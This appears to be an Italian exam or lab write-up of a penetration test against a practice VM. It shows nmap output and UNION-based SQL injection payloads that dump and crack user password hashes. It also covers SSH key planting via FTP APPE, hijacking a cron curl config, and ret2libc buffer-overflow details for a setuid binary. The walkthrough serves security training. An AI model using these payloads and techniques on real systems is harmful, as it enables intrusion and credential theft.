<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Esame2</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>Esame2</u></b></h1>Discovery and Active Enumeration:<br /><br />Effettuando ping scan con nmap trovo l'ip della macchina: 172.16.30.176<br /><br /><h1>nmap -sS -sV 172.16.30.176 --script default,vuln -A</h1><br /><br /><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-26 09:40 CEST<br />Pre-scan script results:<br />| broadcast-avahi-dos: <br />|   Discovered hosts:<br />|     224.0.0.251<br />|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br />|_  Hosts are all up (not vulnerable).<br />Nmap scan report for 172.16.30.176<br />Host is up (0.00043s latency).<br />Not shown: 996 closed ports<br />PORT    STATE SERVICE  VERSION<br />21/tcp  open  ftp      vsftpd 3.0.3<br />|_sslv2-drown: <br />22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 9b:94:12:81:45:fb:0f:41:82:93:e7:63:d0:12:78:83 (RSA)<br />|   256 89:38:5d:89:a4:da:26:8d:bd:b8:e0:f3:7d:82:5c:7c (ECDSA)<br />|_  256 39:45:8c:75:c7:21:93:ee:d3:d4:13:02:4b:54:08:c7 (ED25519)<br />80/tcp  open  http     nginx 1.14.0 (Ubuntu)<br />|_http-csrf: Couldn't find any CSRF vulnerabilities.<br />|_http-dombased-xss: Couldn't find any DOM based XSS.<br />|_http-server-header: nginx/1.14.0 (Ubuntu)<br />|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.<br />|_http-title: Welcome to nginx!<br />| http-vuln-cve2011-3192: <br />|   VULNERABLE:<br />|   Apache byterange filter DoS<br />|     State: VULNERABLE<br />|     IDs:  OSVDB:74721  CVE:CVE-2011-3192<br />|       The Apache web server is vulnerable to a denial of service attack when numerous<br />|       overlapping byte ranges are requested.<br />|     Disclosure date: 2011-08-19<br />|     References:<br />|       <a href="http://seclists.org/fulldisclosure/2011/Aug/175">http://seclists.org/fulldisclosure/2011/Aug/175</a><br />|       <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</a><br />|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</a><br />|       <a href="http://nessus.org/plugins/index.php?view=single&id=55976">http://nessus.org/plugins/index.php?view=single&amp;id=55976</a><br />|_      <a href="http://osvdb.org/74721">http://osvdb.org/74721</a><br />443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)<br />|_http-csrf: Couldn't find any CSRF vulnerabilities.<br />|_http-dombased-xss: Couldn't find any DOM based XSS.<br />|_http-server-header: nginx/1.14.0 (Ubuntu)<br />|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.<br />|_http-title: Welcome to nginx!<br />| http-vuln-cve2011-3192: <br />|   VULNERABLE:<br />|   Apache byterange filter DoS<br />|     State: VULNERABLE<br />|     IDs:  OSVDB:74721  CVE:CVE-2011-3192<br />|       The Apache web server is vulnerable to a denial of service attack when numerous<br />|       overlapping byte ranges are requested.<br />|     Disclosure date: 2011-08-19<br />|     References:<br />|       <a href="http://seclists.org/fulldisclosure/2011/Aug/175">http://seclists.org/fulldisclosure/2011/Aug/175</a><br />|       <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</a><br />|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</a><br />|       <a href="http://nessus.org/plugins/index.php?view=single&id=55976">http://nessus.org/plugins/index.php?view=single&amp;id=55976</a><br />|_      <a href="http://osvdb.org/74721">http://osvdb.org/74721</a><br />| ssl-cert: Subject: commonName=vdsi.com/organizationName=VDSI/stateOrProvinceName=Italy/countryName=IT<br />| Not valid before: 2019-07-24T10:06:38<br />|_Not valid after:  2020-07-23T10:06:38<br />|_ssl-date: TLS randomness does not represent time<br />| ssl-dh-params: <br />|   VULNERABLE:<br />|   Diffie-Hellman Key Exchange Insufficient Group Strength<br />|     State: VULNERABLE<br />|       Transport Layer Security (TLS) services that use Diffie-Hellman groups<br />|       of insufficient strength, especially those using one of a few commonly<br />|       shared groups, may be susceptible to passive eavesdropping attacks.<br />|     Check results:<br />|       WEAK DH GROUP 1<br />|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384<br />|             Modulus Type: Safe prime<br />|             Modulus Source: Unknown/Custom-generated<br />|             Modulus Length: 1024<br />|             Generator Length: 8<br />|             Public Key Length: 1024<br />|     References:<br />|_      <a href="https://weakdh.org">https://weakdh.org</a><br />|_sslv2-drown: <br />| tls-alpn: <br />|_  http/1.1<br />| tls-nextprotoneg: <br />|_  http/1.1<br />MAC Address: 00:0C:29:0A:17:F3 (VMware)<br />Device type: general purpose<br />Running: Linux 3.X|4.X<br />OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br />OS details: Linux 3.2 - 4.9<br />Network Distance: 1 hop<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />TRACEROUTE<br />HOP RTT     ADDRESS<br />1   0.43 ms 172.16.30.176<br /><br />OS and Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 118.13 seconds<br /><br /><br />Sulla porta 443 è presente un certificato ssl nel quale sono presenti dati utili, ovvero il CN vdsi.com<br /><br /><br />| ssl-cert: Subject: commonName=vdsi.com/organizationName=VDSI/stateOrProvinceName=Italy/countryName=IT<br /><br /><br />Lo inserisco negli host conosciuti dalla mia macchina aggiungendo la riga IP DOMINIO in /etc/hosts<br /><br /><br /><img src="images/12-1.png" alt="images/12-1.png" /><br /><br /><br /><br />Effettuo scansione dei virtualhosts eventualmente presenti e verificare così la presenza di sottodomini utili<br /><br /><img src="images/12-2.png" alt="images/12-2.png" /><br /><br />Trovo il sottodominio posts e lo aggiungo come prima agli hosts conosciuti<br /><br /><br />Trovo la seguente pagina, la quale mostra un login e una pagina per registrarsi, effettuo alcune scansioni con gobuster e dirsearch per verificare la presenza di elementi utili, ma non trovo nulla apparte le pagine gia mostrate<br /><br /><img src="images/12-3.png" alt="images/12-3.png" /><br /><br />Noto che nel form di register è possibile inserire qualsiasi valore per l'utente senza essere sottoposti ad alcun tipo di controllo<br /><br /><img src="images/12-4.png" alt="images/12-4.png" /><br /><br />Utilizzando ivan' la pagina posts dopo essersi autenticati da Internal server error<br /><br /> <img src="images/12-5.png" alt="images/12-5.png" /><br /> <br />Provo ad utilizzare ivan' or ‘1’='1 e adesso nella pagina posts compaiono alcuni posts che un utente normale non vede potrebbe sembrare una sqli di tipo blind <br /> <br /> <br />Ma utilizzando utente ‘’' la pagina posts va in errore, quindi è una classica sqli<br /><br /><br /><h3>Trovo il numero delle colonne, con gli utenti : ivan' order by 1 -- - ( non da errore la pagina posts) , ivan' order by 2 -- - (non da errore la pagina posts) mentre : ivan' order by 3 -- - da errore → ciò significa che si hanno 2 colonne</h3><br /><br /><br />Verifico che UNION SELECT funziona con user : ivan' union all select 1,2 -- -  la pagina post mostra i numeri delle colonne come mi aspetto, quindi la UNION funziona!<br /><br /><img src="images/12-6.png" alt="images/12-6.png" /><br /><br /><br /><br />Verifico la versione del DB presente con → ivan' union all select 1,@@version -- -    restituisce 5.5.64-MariaDB-1~trusty<br /><br />Essendo la versione &gt;5 posso utilizare information_schema, genero cos' la query: ivan' union all select 1,table_name from information_schema.tables -- -    trovo così tutte le tabelle presenti nel db (accounts e USER_PRIVILEGE)<br /><br /><img src="images/12-7.png" alt="images/12-7.png" /><br /><br /><br />Per le colonne utilizzo invece information_schema.columns  --&gt; ivan' union all select 1,column_name from information_schema.columns where table_name='accounts'-- -  <br /><br />Conoscendo il nome della tabella e il nome delle colenne posso stamparne i dati utilizzando la query →  ivan' union all select 1,concat(username,0x3a,password,0x3a,email) from accounts -- -<br /><br /><img src="images/12-8.png" alt="images/12-8.png" /><br /><br />albert:1d2342ba3b01187cf910804c0f58311bb17a9fd97abfeff6fa522737564cb44a:albert@vdsi.com<br /><br />antony:9610e041088256a6ff180310724cc89a6d565cfe63ffbadea22c206f8c91275e:antony@vdsi.com<br /><br />developer:88fa0d759f845b47c044c2cd44e29082cf6fea665c30c146374ec7c8f3d699e3:developer@vdsi.com<br /><br />george:04cf34a6366e4877136caad8cb94032c7ccaa4115b832b96ad544a72d1ca637e:george@vdsi.com<br /><br /><br />Trovo la password dell'user antony → mcgwire25  utilizzando crackstation.net<br />                                         developer → developer <br />                                         <br />                                         <br />                                 <img src="images/12-9.png" alt="images/12-9.png" />        <br />                                         <br />                                         <br />Per autenticarsi tramite ssh è possibile soltanto tramite public key, di  conseguenza non è possibile accedevri specificando uno degli users trovati<br /><br />Ma ricordandoci della porta 21 e del servizio vsftpd, effettuando varie prove è possibile accedervi con l'utente antony → <br /><br /><img src="images/12-10.png" alt="images/12-10.png" /><br /><br /><br />Mi informo sul servizio e sui comandi disponibili, trovo aiuto e spiegazione su tutti i comandi <a href="http://www.nsftools.com/tips/RawFTP.htm#CWD">http://www.nsftools.com/tips/RawFTP.htm#CWD</a> <br /><br />Tramite l'utilizzo del comando PASV entrando in modalità passiva autorizzo il server ad accettare connessioni in entrata sul soket generato random(ip della macchina, p1 *256 + p2) <br /><br /><br />Con il comando APPE file_name autorizzo un client a connettersi al socket generato precedentemente con PASV per mandare un file , quindi aggiungo la mia chiave publica in authorized_keys, connettendomi con ssh sono autenticato!<br /><br /><br /><img src="images/12-11.png" alt="images/12-11.png" /><br /><br /><br />Analizzando i processi eseguiti in tempo reale con l'ausilio di pspy64s, l'utente albert (1002) esegue ogni min il seguente comando curl <br /><br />Posso modificare il config.ini in modo da redirigere l'output nella home di albert, nella cartella ssh aggiungendo la mia chiave pubblica in authorized_keys <br /><br /><img src="images/12-12.png" alt="images/12-12.png" />ù<br /><br /><img src="images/12-13.png" alt="images/12-13.png" /><br /><br /><br /><br /><br />Adesso posso accedere al sistema tramite ssh autenticato come Albert<br /><br /><br /><img src="images/12-14.png" alt="images/12-14.png" /><br /><br /><br /><br />In opt, poichè albert appartiene al gruppo suidusers posso leggere la cartella suidapp al cui interno è presente un eseguibile con il set uid abilitato, che legge i file come root... supponendo sia vulnerabile al buffer overflow lo analizzo con ghidra, pensando di utilizzare come ultima strada quella di leggere il file shadow, in caso di emergenza<br /><br /><img src="images/12-15.png" alt="images/12-15.png" /><br /><br /><br />decompilando l'eseguibile con ghidra trovo che il limite offset è 268!  (10c)<br /><br /><img src="images/12-16.png" alt="images/12-16.png" /><br /><br /><br />(indirizzi della macchina vdsi)<br />ASLR set 2 devo provare a lanciare lo stesso payload fino a quando non becco gli indirizzi giusti<br /><br />(python3 non accetta il .decode('hex')<br /><br /><img src="images/12-17.png" alt="images/12-17.png" /><br /><br /><br /><img src="images/12-18.png" alt="images/12-18.png" /><br /><br /><img src="images/12-19.png" alt="images/12-19.png" /><br /><br /><br />Indirizzi necessari al bufferoverflow<br />indirizzo base della libc preso con ldd dell'eseguibile → 0xf7dac000<br />Indirizzo offset della funzione system → 0003cd10 <br />indirizzo offset dell'eseguibile /bin/sh → 17b8cf                                     <br /><br />in locale lo script --&gt; <br /><br /><img src="images/12-20.png" alt="images/12-20.png" /><br /><br /><br /></body></html>